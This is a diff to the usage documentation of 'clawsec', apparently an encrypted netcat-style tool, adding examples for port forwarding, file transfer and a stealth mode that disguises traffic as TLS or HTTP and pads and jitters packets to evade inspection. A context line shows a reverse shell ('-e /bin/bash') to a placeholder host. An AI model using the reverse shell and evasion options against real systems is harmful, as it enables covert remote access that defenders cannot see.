@@ -102,6 +102,34 @@ exit            # Close connection
 
 ## Advanced Options
 
+### Keep-open (multi-client server)
+```bash
+# Server accepts multiple clients, fork per connection
+./clawsec -l -p 8888 -k "Pass" -K
+
+# Clients connect one by one or in parallel
+./clawsec -k "Pass" server.example.com 8888
+```
+
+### Port forwarding (encrypted tunnel)
+```bash
+# Forward remote port 3306 (MySQL) through encrypted tunnel
+# Server side:
+./clawsec -l -p 9999 -k "Pass" -L 127.0.0.1:3306
+
+# Client connects and gets access to MySQL via the tunnel
+./clawsec -k "Pass" server.example.com 9999
+```
+
+### Compressed file transfer with verification
+```bash
+# Receiver
+./clawsec -l -p 8080 -k "Pass" -z -P -V > backup.tar.gz
+
+# Sender
+./clawsec -k "Pass" -z -P -V server.example.com 8080 < backup.tar.gz
+```
+
 ### Connection timeout
 ```bash
 ./clawsec -k "Pass" -w 30 server.example.com 5555
@@ -119,6 +147,49 @@ exit            # Close connection
 
 # Reverse shell with timeout
 ./clawsec -k "Pass" -w 30 -e /bin/bash server.example.com 8888
+```
+
+## Stealth Mode (Anti-DPI / Anti-Fingerprint)
+
+### TLS 1.3 camouflage — traffic looks like HTTPS
+```bash
+# Server on port 443 — indistinguishable from a regular HTTPS server
+./clawsec -l -p 443 -k "StealthPass" --obfs tls
+
+# Client — DPI sees a normal TLS 1.3 handshake
+./clawsec -k "StealthPass" --obfs tls server.example.com 443
+```
+
+### HTTP obfuscation — traffic looks like web requests
+```bash
+# Server
+./clawsec -l -p 80 -k "Pass" --obfs http
+
+# Client
+./clawsec -k "Pass" --obfs http server.example.com 80
+```
+
+### Maximum stealth — all anti-fingerprint features combined
+```bash
+# Server: TLS + padding + jitter
+./clawsec -l -p 443 -k "MaxStealth" --obfs tls --pad --jitter 100
+
+# Client: same flags required on both sides
+./clawsec -k "MaxStealth" --obfs tls --pad --jitter 100 server.example.com 443
+```
+
+### Packet padding only (uniform packet sizes)
+```bash
+# All packets become 1400 bytes — defeats size-based traffic analysis
+./clawsec -l -p 8888 -k "Pass" --pad
+./clawsec -k "Pass" --pad server.example.com 8888
+```
+
+### Timing jitter only (random delays)
+```bash
+# Add 0-50ms random delay between packets
+./clawsec -l -p 8888 -k "Pass" --jitter 50
+./clawsec -k "Pass" --jitter 50 server.example.com 8888
 ```
 
 ## Security Best Practices
